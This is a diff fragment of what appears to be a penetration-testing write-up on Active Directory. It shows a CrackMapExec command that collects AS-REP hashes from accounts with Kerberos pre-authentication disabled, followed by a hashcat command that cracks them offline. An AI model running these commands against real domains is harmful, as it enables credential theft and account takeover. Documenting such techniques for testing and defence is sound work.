@@ -155,8 +155,7 @@ Run (where `users.txt` holds some User Accounts + Service Accounts) gives us mat
 
 Using CME we can also find accounts with pre-authentication disabled:
 
-
-`crackmapexec ldap 172.140.0.40 -u users.txt -p '' --asreproast out.txt`
+`crackmapexec ldap dc01.xyz.com -u users.txt -p '' --asreproast out.txt`
 
 We then crack the account's AS-REP message offline using:
 `hashcat -m18200 out.txt passwords.txt`
